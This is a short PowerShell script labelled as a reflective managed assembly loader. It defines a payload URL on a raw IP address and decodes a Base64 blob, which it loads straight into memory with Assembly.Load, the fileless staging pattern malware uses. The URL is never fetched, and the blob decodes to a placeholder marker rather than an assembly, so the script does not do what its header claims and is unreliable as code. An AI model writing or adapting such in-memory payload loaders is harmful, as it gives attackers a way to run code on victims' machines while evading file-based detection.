
<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
$Stage1Url = "https://203.0.113.49/payload.bin"
$ErrorActionPreference = "Stop"

$PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjozb2ozZm12M3Jj")
Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
$ResultObject = [Reflection.Assembly]::Load($PayloadBytes)
if ($null -ne $ResultObject) {
    Write-Verbose ("Loaded assembly: " + $ResultObject.FullName)
}

$ProgressPreference = "SilentlyContinue"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
